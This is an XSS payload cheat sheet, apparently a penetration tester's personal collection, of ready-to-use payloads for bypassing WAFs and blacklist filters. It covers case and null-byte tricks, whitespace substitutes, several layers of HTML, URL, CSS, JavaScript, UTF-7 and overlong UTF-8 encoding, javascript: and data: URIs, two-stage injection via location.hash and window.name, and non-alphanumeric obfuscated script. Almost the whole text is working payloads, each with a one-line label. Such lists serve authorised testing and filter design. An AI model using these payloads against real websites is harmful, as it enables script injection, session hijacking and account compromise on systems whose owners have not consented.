 _____ _          _   _          __   _______ _____   _____ _                _       _               _   
|  __ \ |        | | | |         \ \ / /  ___/  ___| /  __ \ |              | |     | |             | |  
| |  \/ |__   ___| |_| |_  ___    \ V /\ `--.\ `--.  | /  \/ |__   ___  __ _| |_ ___| |__   ___  ___| |_ 
| | __| '_ \ / _ \ __| __|/ _ \   /   \ `--. \`--. \ | |   | '_ \ / _ \/ _` | __/ __| '_ \ / _ \/ _ \ __|
| |_\ \ | | |  __/ |_| |_| (_) | / /^\ |\__/ /\__/ / | \__/\ | | |  __/ (_| | |_\__ \ | | |  __/  __/ |_ 
 \____/_| |_|\___|\__|\__|\___/  \/   \|____/\____/   \____/_| |_|\___|\__,_|\__|___/_| |_|\___|\___|\__|
 
A ghetto collection of XSS payloads that I find to be useful during penetration tests, especially when faced with WAFs or application-based black-list filtering, but feel free to disagree or shoot your AK-74 in the air.
                                                                                                        
Simple character manipulations.  
Note that I use hexadecimal to represent characters that you probably can't type.  For example, \x00 equals a null byte, but you'll need to encode this properly depending on the context (URL encoding \x00 = %00).

HaRdc0r3 caS3 s3nsit1vITy bYpa55!
<sCrIpt>alert(1)</ScRipt>
<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>

Null-byte character between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x00=alert(0) />

Slash character between HTML attribute name and equal sign (IE, Firefox, Chrome, Safari).
<img src='1' onerror/=alert(0) />

Vertical tab between HTML attribute name and equal sign (IE, Safari).
<img src='1' onerror\x0b=alert(0) />

Null-byte character between equal sign and JavaScript code (IE).
<img src='1' onerror=\x00alert(0) />

Null-byte character between characters of HTML attribute names (IE).
<img src='1' o\x00nerr\x00or=alert(0) />

Null-byte character before characters of HTML element names (IE).
<\x00img src='1' onerror=alert(0) />

Null-byte character after characters of HTML element names (IE, Safari).
<script\x00>alert(1)</script>

Null-byte character between characters of HTML element names (IE).
<i\x00mg src='1' onerror=alert(0) />

Use slashes instead of whitespace (IE, Firefox, Chrome, Safari).
<img/src='1'/onerror=alert(0)>

Use vertical tabs instead of whitespace (IE, Safari).
<img\x0bsrc='1'\x0bonerror=alert(0)>

Use quotes instead of whitespace in some situations (Safari).
<img src='1''onerror='alert(0)'>
<img src='1'"onerror="alert(0)">

Use null-bytes instead of whitespaces in some situations (IE).
<img src='1'\x00onerror=alert(0)>

Just don't use spaces (IE, Firefox, Chrome, Safari).
<img src='1'onerror=alert(0)>

Prefix URI schemes.
Firefox (\x09, \x0a, \x0d, \x20)
Chrome (Any character \x01 to \x20)
<iframe src="\x01javascript:alert(0)"></iframe> <!-- Example for Chrome -->

No greater-than characters needed (IE, Firefox, Chrome, Safari).
<img src='1' onerror='alert(0)' <

Extra less-than characters (IE, Firefox, Chrome, Safari).
<<script>alert(0)</script>

Backslash character between expression and opening parenthesis (IE).
<style>body{background-color:expression\(alert(1))}</style>

JavaScript Escaping
<script>document.write('<a hr\ef=j\avas\cript\:a\lert(2)>blah</a>');</script>

Encoding Galore.

HTML Attribute Encoding
<img src="1" onerror="alert(1)" />
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:alert(1)"></iframe>
<iframe src="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;"></iframe>

URL Encoding
<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>

CSS Hexadecimal Encoding (IE specific examples)
<div style="x:expression(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e(alert(1))">Joker</div>
<div style="x:\000065\000078\000070\000072\000065\000073\000073\000069\00006f\00006e(alert(1))">Joker</div>
<div style="x:\65\78\70\72\65\73\73\69\6f\6e\028 alert \028 1 \029 \029">Joker</div>

JavaScript (hexadecimal, octal, and unicode)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write('\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x31\x20\x6F\x6E\x65\x72\x72\x6F\x72\x3D\x61\x6C\x65\x72\x74\x28\x31\x29\x3E');</script>
<script>document.write('\074\151\155\147\040\163\162\143\075\061\040\157\156\145\162\162\157\162\075\141\154\145\162\164\050\061\051\076');</script>
<script>document.write('\u003C\u0069\u006D\u0067\u0020\u0073\u0072\u0063\u003D\u0031\u0020\u006F\u006E\u0065\u0072\u0072\u006F\u0072\u003D\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029\u003E');</script>

JavaScript (Decimal char codes)
<script>document.write('<img src=1 onerror=alert(1)>');</script>
<script>document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,49,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,48,41,62));</script>

JavaScript (Unicode function and variable names)
<script>alert(123)</script>
<script>\u0061\u006C\u0065\u0072\u0074(123)</script>

Overlong UTF-8 (SiteMinder is awesome!)
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2

<img src="1" onnerror="alert(1)">
%E0%80%BCimg%20src%3D%E0%80%A21%E0%80%A2%20onerror%3D%E0%80%A2alert(1)%E0%80%A2%E0%80%BE

UTF-7 (Missing charset?)
<img src="1" onerror="alert(1)" />
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-

Unicode .NET Ugliness
<script>alert(1)</script>
%uff1cscript%uff1ealert(1)%uff1c/script%uff1e

Classic ASP performs some unicode homoglyphic translations... don't ask why...
<img src="1" onerror="alert('1')">
%u3008img%20src%3D%221%22%20onerror%3D%22alert(%uFF071%uFF07)%22%u232A

Useless and/or Useful features.

HTML 5 (Not comphrensive)
<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />
<video src="http://www.w3schools.com/html5/movie.ogg" onloadstart="alert(1)" />

Usuage of non-existent elements (IE)
<blah style="blah:expression(alert(1))" />

CSS Comments (IE)
<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />

Alternate ways of executing JavaScript functions
<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
<script>top['alert'](3)</script>

Split up JavaScript into HTML attributes
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>

HTML is parsed before JavaScript
<script>
var junk = '</script><script>alert(1)</script>';
</script>

HTML is parsed before CSS
<style>
body { background-image:url('http://www.blah.com/</style><script>alert(1)</script>'); }
</style>

XSS in XML documents [doctype = text/xml] (Firefox, Chrome, Safari).
<?xml version="1.0" ?>
<someElement>
	<a xmlns:a='http://www.w3.org/1999/xhtml'><a:body onload='alert(1)'/></a>
</someElement>

URI Schemes
<iframe src="javascript:alert(1)"></iframe>
<iframe src="vbscript:msgbox(1)"></iframe> (IE)
<iframe src="data:text/html,<script>alert(0)</script>"></iframe> (Firefox, Chrome, Safari)
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe> (Firefox, Chrome, Safari)

HTTP Parameter Pollution
http://target.com/something.xxx?a=val1&a=val2
ASP.NET 	a = val1,val2
ASP 		a = val1,val2
JSP 		a = val1
PHP 		a = val2

Two Stage XSS via fragment identifier (bypass length restrictions / avoid server logging)
<script>eval(location.hash.slice(1))</script>
<script>eval(location.hash)</script> (Firefox)

http://target.com/something.jsp?inject=<script>eval(location.hash.slice(1))</script>#alert(1)

Two Stage XSS via name attribute
<iframe src="http://target.com/something.jsp?inject=<script>eval(name)</script>" name="alert(1)"></iframe>

Non-alphanumeric crazyness...
<script>
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();
</script>

<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()
</script>
